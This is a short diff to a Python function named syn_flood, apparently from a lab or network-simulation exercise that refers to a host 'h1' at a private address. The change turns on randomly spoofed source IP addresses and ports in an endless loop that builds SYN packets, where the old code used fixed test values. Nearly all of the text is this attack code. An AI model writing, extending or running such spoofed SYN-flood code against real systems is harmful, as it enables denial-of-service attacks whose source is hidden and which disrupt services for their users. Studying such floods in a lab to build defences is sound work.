@@ -10,10 +10,11 @@ def syn_flood():
 
     while True:
         # Generate a random source IP and port for spoofing
-        #src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
-        #src_port = random.randint(1024, 65535)
-        src_ip = "192.168.1.2" # Use h1's real IP for testing
-        src_port = 1234
+        src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+        src_port = random.randint(1024, 65535)  # Random source port must be an integer
+        #You can also comment above and uncomment below to try with legitimate values
+        #src_ip = "192.168.1.2" # Use h1's real IP for testing
+        #src_port = 1234
 
         # Build the SYN packet
         seq = random.randint(1000, 9000)  # Random sequence number
